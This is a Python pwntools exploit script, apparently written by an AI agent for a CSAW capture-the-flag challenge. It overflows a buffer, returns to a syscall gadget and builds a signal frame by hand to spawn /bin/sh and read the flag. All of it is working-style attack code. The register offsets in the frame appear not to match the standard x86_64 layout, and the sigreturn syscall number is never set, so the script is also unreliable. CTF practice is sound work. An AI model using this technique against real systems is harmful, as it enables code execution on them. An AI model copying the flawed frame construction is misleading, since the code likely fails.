from pwn import *

# Connect to server
p = remote("pwn.chal.csaw.io", 8000)

# Addresses
syscall_addr = 0x400185  # syscall; ret
binsh_addr = 0x4001ca    # "/bin/sh" string

# Manually construct sigcontext structure
# We need to fill the structure with zeros first, then set specific registers
frame = b'\x00' * 0xc0  # allocate enough space

# Convert to list for easy manipulation
frame_list = list(frame)

# Set registers at correct offsets (x86_64)
# rax = 59 (sys_execve) at offset 0x80
frame_list[0x80] = 59
frame_list[0x81] = 0
frame_list[0x82] = 0  
frame_list[0x83] = 0
frame_list[0x84] = 0
frame_list[0x85] = 0
frame_list[0x86] = 0
frame_list[0x87] = 0

# rdi = binsh_addr at offset 0x78
binsh_bytes = p64(binsh_addr)
for i in range(8):
    frame_list[0x78 + i] = binsh_bytes[i]

# rsi = 0 at offset 0x68 (already zero)

# rdx = 0 at offset 0x70 (already zero)

# rip = syscall_addr at offset 0xb8
syscall_bytes = p64(syscall_addr)
for i in range(8):
    frame_list[0xb8 + i] = syscall_bytes[i]

frame = bytes(frame_list)

# Payload
payload = b"A" * 40      # padding
payload += p64(syscall_addr)  # return to syscall
payload += frame         # sigcontext structure

p.send(payload)
p.sendline(b"cat flag")
print(p.recvall(timeout=5).decode('ascii', errors='ignore'))
end_of_edit

